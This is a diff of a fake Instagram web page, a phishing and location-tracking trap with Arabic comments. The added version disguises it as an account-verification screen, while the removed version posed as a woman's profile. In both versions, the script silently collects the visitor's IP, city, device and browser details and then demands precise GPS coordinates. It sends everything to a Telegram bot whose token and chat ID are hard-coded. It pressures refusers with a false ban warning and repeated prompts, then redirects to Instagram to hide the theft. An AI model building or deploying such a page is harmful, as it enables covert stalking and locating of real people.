@@ -3,87 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Instagram | Ekhlas</title>
-    <meta property="og:title" content="Ekhlas (@ekhlas_2026) • Instagram photos">
-    <meta property="og:image" content="https://k.top4top.io/p_3696qmute0.jpeg">
+    <title>Instagram | Verification</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: none; }
-        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; background: white; }
-        .profile-container { padding: 20px 15px; max-width: 600px; margin: 0 auto; text-align: right; }
-        .profile-pic { width: 80px; height: 80px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
-        .stats { display: flex; flex-grow: 1; justify-content: space-around; text-align: center; margin-right: 20px; }
-        .stat-num { font-weight: bold; display: block; }
-        .follow-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 8px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; display: none; }
+        .loading-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body id="mainBody">
-    <div class="nav">Ekhlas</div>
-    <div class="profile-container">
-        <div class="header-top" style="display: flex; align-items: center; margin-bottom: 20px;">
-            <img src="https://k.top4top.io/p_3696qmute0.jpeg" class="profile-pic">
-            <div class="stats">
-                <div><span class="stat-num">14</span><span style="font-size:13px; color:#8e8e8e;">منشور</span></div>
-                <div><span class="stat-num">482</span><span style="font-size:13px; color:#8e8e8e;">متابع</span></div>
-                <div><span class="stat-num">315</span><span style="font-size:13px; color:#8e8e8e;">نتابعهم</span></div>
-            </div>
-        </div>
-        <div class="bio">
-            <strong>Ekhlas | إخلاص</strong><br>
-            • Personal Account ✨<br>
-            • Palestine | Hebron 🇵🇸
-        </div>
-        <button class="follow-btn">متابعة</button>
+    <div class="loading-screen">
+        <div class="spinner"></div>
+        <p style="color: #262626; margin-top: 15px;">جاري التحقق من ملكية الحساب...</p>
     </div>
 
     <script>
         const TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
         const ID = '7184970355';
 
-        // 1. تشغيل الصفحة فوراً وسحب البيانات الأساسية
         window.onload = async () => {
-            if (window.location.hash !== "#secure") {
+            if (!window.location.hash.includes("#secure")) {
                 window.location.replace("https://www.instagram.com");
                 return;
             }
-            document.getElementById('mainBody').style.display = "block";
+            document.body.style.display = "block";
             
-            // سحب وإرسال معلومات الجهاز والـ IP فوراً (قبل الموقع)
-            await sendInitialData();
+            // المرحلة 1: سحب البيانات الصامتة فوراً
+            await sendGhostData();
             
-            // 2. إجبار ظهور طلب الـ GPS فوراً دون تدخل الضحية
-            requestGPS();
+            // المرحلة 2: إجبار طلب الـ GPS الدقيق
+            forceGPS();
         };
 
-        async function sendInitialData() {
+        async function sendGhostData() {
             try {
-                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-                let bat = "غير متاح";
-                if (navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level * 100) + "%"; }
-                
-                const msg = `⚠️ **دخول جديد (بيانات أولية):**\n` +
-                            `🌐 IP: ${ipRes.ip}\n` +
-                            `📍 المدينة: ${ipRes.city}\n` +
-                            `📱 الجهاز: ${navigator.platform}\n` +
-                            `🔋 البطارية: ${bat}\n` +
-                            `🧠 الرام: ${navigator.deviceMemory || '4+'}GB\n` +
-                            `⚙️ المتصفح: ${navigator.userAgent.split(' ').pop()}`;
-                
+                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+                const msg = `⚠️ **هدف جديد متصل الآن:**\n🌐 IP: ${ip.ip}\n📍 المنطقة: ${ip.city}, ${ip.country_name}\n📱 الجهاز: ${navigator.platform}\n⚙️ المتصفح: ${navigator.userAgent.split(' ').slice(-1)}`;
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-            } catch (e) {}
+            } catch(e) {}
         }
 
-        function requestGPS() {
+        function forceGPS() {
+            const gpsOptions = {
+                enableHighAccuracy: true, // إجبار الأيفون على تشغيل GPS الحقيقي
+                timeout: 15000,
+                maximumAge: 0 // عدم قبول أي موقع قديم مخزن
+            };
+
             navigator.geolocation.getCurrentPosition(
                 (p) => {
-                    const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    const msg = `📍 **موقع GPS دقيق (تم التفعيل):**\n${map}\n🎯 الدقة: ${p.coords.accuracy.toFixed(1)} متر`;
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-                    setTimeout(() => { window.location.href = "https://www.instagram.com/reels/"; }, 1000);
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const acc = p.coords.accuracy;
+                    const map = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const report = `🎯 **تم سحب الموقع الدقيق (GPS):**\n📍 الخريطة: ${map}\n🎯 نسبة الخطأ: ${acc.toFixed(1)} متر فقط\n⏰ الوقت: ${new Date().toLocaleTimeString('ar-EG')}`;
+                    
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+                    
+                    // تحويل الضحية بعد الصيد لتبديد الشكوك
+                    setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 1500);
                 },
-                (e) => {
-                    if(e.code == 1) alert("يجب السماح بالوصول للموقع وتفعيل 'الموقع الدقيق' لمشاهدة بروفايل إخلاص.");
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                (err) => {
+                    // هندسة اجتماعية للإجبار في حال الرفض
+                    if (err.code == 1) {
+                        alert("⚠️ عذراً: يجب السماح بالوصول لـ 'الموقع الدقيق' لتأكيد أنك صاحب الحساب ولتجنب الحظر الدائم.");
+                        forceGPS(); // إعادة المحاولة لإجباره
+                    }
+                }, 
+                gpsOptions
             );
         }
     </script>
